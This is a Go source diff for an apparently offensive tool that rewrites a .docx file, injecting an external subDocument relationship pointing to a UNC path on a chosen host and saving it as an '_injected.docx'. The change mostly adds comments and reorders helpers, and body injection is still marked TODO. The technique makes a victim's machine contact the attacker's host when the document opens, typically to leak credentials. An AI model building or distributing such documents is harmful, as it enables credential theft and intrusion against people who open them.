@@ -9,63 +9,53 @@ import (
 	"os"
 	"sort"
 	"strconv"
+	"strings"
 )
 
-// Appends file and data to a new zip file
-func appendToZip(zipName string, zipData []byte) {
-	ZipArray.Files = append(ZipArray.Files, ZipFile{
-		Name:     zipName,
-		Contents: zipData,
-	})
-}
-
-// Marshals the XML data with the XML Prolog
-func marshalWithHeader(v interface{}) ([]byte, error) {
-	parsed, err := xml.Marshal(v)
-	if err != nil {
-		return nil, err
-	}
-	parsed = []byte(Header + string(parsed))
-
-	return parsed, nil
-}
-
+// Initializes routine
 func Initialize(fileName string) error {
 	log.Println("Opening document...")
 
+	// Read zip (ooxml) file
 	r, err := zip.OpenReader(fileName)
 	if err != nil {
 		return err
 	}
 	defer r.Close()
 
+	// Loop through all the files inside the zip
 	for _, f := range r.File {
 		rc, err := f.Open()
 		if err != nil {
 			return err
 		}
 
+		// Read all the data inside the file
 		zipData, err := io.ReadAll(rc)
 		if err != nil {
 			return err
 		}
 		rc.Close()
 
-		if err = EditPackage(f, zipData); err != nil {
+		// Call editPackage to change the contents of the target file
+		if err = editPackage(f, zipData); err != nil {
 			return err
 		}
 	}
 
-	if err = WritePackage("output.docx"); err != nil {
+	// Call writePackage to save the edited contents to a file
+	if err = writePackage(fmt.Sprintf("%s_injected.docx", strings.Split(fileName, ".")[0])); err != nil {
 		return err
 	}
 
 	return nil
 }
 
-func EditPackage(zipFile *zip.File, zipData []byte) error {
+// Edits the contents of a zip file
+func editPackage(zipFile *zip.File, zipData []byte) error {
+	// Only the list of files we need to change
 	switch zipFile.Name {
-	case CDocumentXMLRels:
+	case CDocumentXMLRels: // Add a new relationship element to the list
 		rs := Relationships{}
 		if err := xml.Unmarshal(zipData, &rs); err != nil {
 			return err
@@ -81,10 +71,10 @@ func EditPackage(zipFile *zip.File, zipData []byte) error {
 			idList = append(idList, out)
 		}
 		sort.Ints(idList)
-		targetId := idList[len(idList)-1] + 1
+		targetId := fmt.Sprintf("rId%d", idList[len(idList)-1]+1)
 
 		rs.Relationships = append(rs.Relationships, Relation{
-			Id:         fmt.Sprintf("rId%d", targetId),
+			Id:         targetId,
 			Type:       "http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument",
 			Target:     fmt.Sprintf("file:///\\\\%s\\doc\\", GlobalVar.Target),
 			TargetMode: "External",
@@ -97,19 +87,20 @@ func EditPackage(zipFile *zip.File, zipData []byte) error {
 
 		appendToZip(zipFile.Name, rsParsed)
 
-	case CDocument:
+	case CDocument: // The idea here is find the position of the last </w:p> before <w:sectPr> and append the subdoc element before that
 		appendToZip(zipFile.Name, zipData)
-	case CStyles:
+
+	case CStyles: // TODO
 		appendToZip(zipFile.Name, zipData)
-	default:
-		// Append all other
+	default: // Appends all other unchanged files to the zip
 		appendToZip(zipFile.Name, zipData)
 	}
 
 	return nil
 }
 
-func WritePackage(fileName string) error {
+// Writes a new zip file with the edited content
+func writePackage(fileName string) error {
 	f, err := os.Create(fileName)
 	if err != nil {
 		return err
@@ -137,4 +128,23 @@ func WritePackage(fileName string) error {
 	}
 
 	return nil
+}
+
+// Appends file and data to a new zip file
+func appendToZip(zipName string, zipData []byte) {
+	ZipArray.Files = append(ZipArray.Files, ZipFile{
+		Name:     zipName,
+		Contents: zipData,
+	})
+}
+
+// Marshals the XML data with the custom XML Prolog
+func marshalWithHeader(v interface{}) ([]byte, error) {
+	parsed, err := xml.Marshal(v)
+	if err != nil {
+		return nil, err
+	}
+	parsed = []byte(Header + string(parsed))
+
+	return parsed, nil
 }
